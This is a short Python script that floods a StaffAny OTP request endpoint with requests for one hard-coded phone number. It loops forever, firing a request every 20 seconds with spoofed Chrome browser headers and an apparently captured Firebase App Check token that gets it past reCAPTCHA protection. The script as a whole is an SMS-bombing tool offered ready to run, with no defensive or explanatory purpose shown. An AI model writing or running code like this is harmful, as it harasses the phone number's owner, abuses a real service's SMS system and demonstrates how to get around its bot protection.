import requests, time

url = "https://api.staffany.com/otp/request?platform=web"

headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
    "content-type": "application/json",
    "origin": "https://app.staffany.com",
    "referer": "https://app.staffany.com/",
    "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "x-firebase-appcheck": "eyJraWQiOiIwMHlhdmciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjQ4NTg2Njg4OTU2OTp3ZWI6N2Q0OTc3YWM0MmZjZDQxMTczZTUyMCIsImF1ZCI6WyJwcm9qZWN0c1wvNDg1ODY2ODg5NTY5IiwicHJvamVjdHNcL3N0YWZmYW55LXBpeGllIl0sInByb3ZpZGVyIjoicmVjYXB0Y2hhX2VudGVycHJpc2UiLCJpc3MiOiJodHRwczpcL1wvZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbVwvNDg1ODY2ODg5NTY5IiwiZXhwIjoxNzUzMjg4MzMxLCJpYXQiOjE3NTMyODQ3MzEsImp0aSI6IjZ3WE95UHJHV3IyMGx4UGhUQjZmQi1JSEUyb09na05OMUk5aXQ4cjRreVEifQ.TjP2I5BTK72aY0t1_OlAfvKKC9hjy4W2ALB5guh0RT3gXf80GhylvroptlapNnEuc4INLTC3xawLZ7wT9zEeZtZ8hheYShzkkBEe9h3ZtFnwrtKwhbcWElO4EwQ1iPQLh6NNmYf-szxUllFwsGnOz6KnAAu00vwnEwaeLFJJbU1G2Z2LTCIYtmS5j0IsjcEaJz89_C27m53t9L4tA9egbpm8G2OCLM6XtTsdoF_KSBzgLgA_O7rdySSSjStJmGcjSTOwEfe7fStumGkCY2c8DII2Oy_Y_iz0W97pMS4ZkPWxYT5_i2VvI4IyLZq8QmTYzHZLdybAKzIuc1_sbAxPQ13bV0Y7n2M8GHTLq5wYFsJ8zsx3eIoHaw5XuI-oyrOIe3Bsk18LRp8-bc9xoZJ2TrzecAsSDHSGU1MGPCFmaAIX4l7V0JpEhLHw0Zwu1nW1wzn5IvA-yM_9wkRSV39E_rYKl_1QOUXtj20lpc0LxxisGebXktipByDpz6lSXSMb"
}

payload = {
    "phoneNumber": "+258821727391"
}

while True:
    response = requests.post(url, json=payload, headers=headers)
    print("Status Code:", response.status_code)
    print("Response Text:", response.text)
    time.sleep(20)
